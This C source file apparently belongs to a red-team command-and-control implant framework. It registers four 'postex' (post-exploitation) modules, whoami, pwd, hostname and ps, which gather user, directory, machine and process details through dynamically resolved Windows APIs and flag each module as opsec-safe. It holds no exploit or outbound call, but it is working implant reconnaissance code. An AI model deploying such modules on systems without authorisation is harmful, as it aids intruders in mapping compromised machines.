#include <windows.h>
#include "../agent/src/agent.h"
#include "../agent/libs/LibDebug/src/debug.h"
#include "../agent/libs/LibUtils/src/utils.h"

WINBASEAPI BOOL WINAPI ADVAPI32$GetUserNameA(LPSTR, LPDWORD);
WINBASEAPI DWORD WINAPI KERNEL32$GetCurrentDirectoryA(DWORD, LPSTR);
WINBASEAPI DWORD WINAPI KERNEL32$GetCurrentProcessId(void);
WINBASEAPI BOOL WINAPI KERNEL32$GetComputerNameA(LPSTR, LPDWORD);

WINBASEAPI HANDLE WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD, DWORD);
WINBASEAPI BOOL WINAPI KERNEL32$Process32First(HANDLE, void *);
WINBASEAPI BOOL WINAPI KERNEL32$Process32Next(HANDLE, void *);
WINBASEAPI BOOL WINAPI KERNEL32$CloseHandle(HANDLE);

static int cmd_whoami(AgentConfig *config, const void *args, size_t args_len, AgentOutput *output) {
    (void)config; (void)args; (void)args_len;
    char buf[256];
    DWORD len = sizeof(buf);

    if (ADVAPI32$GetUserNameA(buf, &len)) {
        output->type = OUTPUT_TYPE_TEXT;
        output->data_len = util_strlen(buf);
        output->data = util_malloc(output->data_len + 1);
        if (output->data)
            util_memcpy(output->data, buf, output->data_len + 1);
        return 0;
    }

    output->type = OUTPUT_TYPE_ERROR;
    output->error_code = -1;
    return -1;
}

static int cmd_pwd(AgentConfig *config, const void *args, size_t args_len, AgentOutput *output) {
    (void)config; (void)args; (void)args_len;
    char buf[MAX_PATH];
    DWORD len = KERNEL32$GetCurrentDirectoryA(sizeof(buf), buf);

    if (len > 0) {
        output->type = OUTPUT_TYPE_TEXT;
        output->data_len = len;
        output->data = util_malloc(len + 1);
        if (output->data)
            util_memcpy(output->data, buf, len + 1);
        return 0;
    }

    output->type = OUTPUT_TYPE_ERROR;
    output->error_code = -1;
    return -1;
}

static int cmd_hostname(AgentConfig *config, const void *args, size_t args_len, AgentOutput *output) {
    (void)config; (void)args; (void)args_len;
    char buf[256];
    DWORD len = sizeof(buf);

    if (KERNEL32$GetComputerNameA(buf, &len)) {
        output->type = OUTPUT_TYPE_TEXT;
        output->data_len = util_strlen(buf);
        output->data = util_malloc(output->data_len + 1);
        if (output->data)
            util_memcpy(output->data, buf, output->data_len + 1);
        return 0;
    }

    output->type = OUTPUT_TYPE_ERROR;
    output->error_code = -1;
    return -1;
}

typedef struct {
    DWORD dwSize;
    DWORD cntUsage;
    DWORD th32ProcessID;
    ULONG_PTR th32DefaultHeapID;
    DWORD th32ModuleID;
    DWORD cntThreads;
    DWORD th32ParentProcessID;
    LONG  pcPriClassBase;
    DWORD dwFlags;
    char  szExeFile[260];
} PE32;

static int cmd_ps(AgentConfig *config, const void *args, size_t args_len, AgentOutput *output) {
    (void)config; (void)args; (void)args_len;

    HANDLE snap = KERNEL32$CreateToolhelp32Snapshot(0x00000002, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        output->type = OUTPUT_TYPE_ERROR;
        output->error_code = -1;
        return -1;
    }

    char *buf = (char *)util_malloc(16384);
    if (!buf) {
        KERNEL32$CloseHandle(snap);
        output->type = OUTPUT_TYPE_ERROR;
        output->error_code = -2;
        return -1;
    }

    char *p = buf;
    int remaining = 16000;

    const char *hdr = "PID\tPPID\tNAME\n";
    while (*hdr && remaining > 0) { *p++ = *hdr++; remaining--; }

    PE32 entry;
    entry.dwSize = sizeof(PE32);

    if (KERNEL32$Process32First(snap, &entry)) {
        do {
            if (remaining < 300) break;

            char pid_str[16], ppid_str[16];
            util_utoa(pid_str, entry.th32ProcessID);
            util_utoa(ppid_str, entry.th32ParentProcessID);

            const char *s = pid_str;
            while (*s && remaining > 0) { *p++ = *s++; remaining--; }
            if (remaining > 0) { *p++ = '\t'; remaining--; }

            s = ppid_str;
            while (*s && remaining > 0) { *p++ = *s++; remaining--; }
            if (remaining > 0) { *p++ = '\t'; remaining--; }

            s = entry.szExeFile;
            while (*s && remaining > 0) { *p++ = *s++; remaining--; }
            if (remaining > 0) { *p++ = '\n'; remaining--; }

        } while (KERNEL32$Process32Next(snap, &entry));
    }

    *p = '\0';
    KERNEL32$CloseHandle(snap);

    output->type = OUTPUT_TYPE_TEXT;
    output->data = buf;
    output->data_len = (size_t)(p - buf);
    return 0;
}

int demo_postex_register(AgentConfig *config) {
    Module m;

    util_memset(&m, 0, sizeof(Module));
    m.name = "whoami";
    m.category = "postex";
    m.description = "Print current username";
    m.exec = cmd_whoami;
    m.opsec_safe = TRUE;
    module_register(config, &m);

    util_memset(&m, 0, sizeof(Module));
    m.name = "pwd";
    m.category = "postex";
    m.description = "Print working directory";
    m.exec = cmd_pwd;
    m.opsec_safe = TRUE;
    module_register(config, &m);

    util_memset(&m, 0, sizeof(Module));
    m.name = "hostname";
    m.category = "postex";
    m.description = "Print computer name";
    m.exec = cmd_hostname;
    m.opsec_safe = TRUE;
    module_register(config, &m);

    util_memset(&m, 0, sizeof(Module));
    m.name = "ps";
    m.category = "postex";
    m.description = "List running processes";
    m.exec = cmd_ps;
    m.opsec_safe = TRUE;
    module_register(config, &m);

    return 0;
}
